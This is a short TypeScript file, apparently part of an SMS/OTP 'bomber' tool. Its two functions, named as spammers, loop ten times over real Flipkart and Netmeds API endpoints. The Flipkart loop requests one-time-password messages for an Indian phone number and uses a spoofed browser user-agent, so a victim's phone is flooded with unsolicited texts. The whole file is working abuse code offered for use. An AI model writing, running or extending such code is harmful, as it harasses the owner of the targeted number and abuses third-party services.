import axios from "axios"

export async function SpammerFlipkart(target : number) {
    for (let i = 0; i < 10; i++) {
        await axios.post("https://2.rome.api.flipkart.com/api/7/user/otp/generate", {
            loginId: `+91${target}`,
        }, {
            headers: {
                "X-User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0 FKUA/website/42/website/Desktop"
            }
        })
    }
}

export async function SpammerNetmeds(target : number){
    for(let i = 0 ; i< 10 ; i++){
    await axios.get("https://www.netmeds.com/mst/rest/v1/id/details/"+`${target}`)
      }
}